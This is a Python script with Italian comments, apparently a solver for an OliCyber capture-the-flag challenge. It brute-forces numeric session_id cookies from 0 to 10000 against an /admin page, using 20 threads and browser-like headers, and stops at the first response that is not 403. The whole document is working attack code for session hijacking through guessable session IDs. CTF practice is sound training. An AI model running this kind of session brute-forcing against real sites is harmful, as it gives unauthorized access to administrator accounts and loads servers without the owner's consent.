import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://too-small-reminder.challs.olicyber.it/admin"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
}

# Variabile di controllo per fermare i thread
found = False

def check_cookie(i):
    global found
    if found:
        return

    cookies = {"session_id": str(i)}
    try:
        # Timeout aggiunto per evitare blocchi infiniti
        response = requests.get(url, headers=headers, cookies=cookies, timeout=5)
        
        if i % 100 == 0:
            print(f"Provando ID: {i}...", end="\r")

        if response.status_code != 403:
            found = True
            print(f"\n\n[!] TROVATO! ID: {i} - Status: {response.status_code}")
            print(f"Risposta: {response.text[:200]}...") # Primi 200 caratteri
            return i
    except Exception:
        pass

def main():
    print(f"Avvio brute force multithread su: {url}")
    # max_workers=20 è un buon compromesso per non crashare il server
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_cookie, range(10001))

    if not found:
        print("\nFine test. Nulla di trovato.")

if __name__ == "__main__":
    main()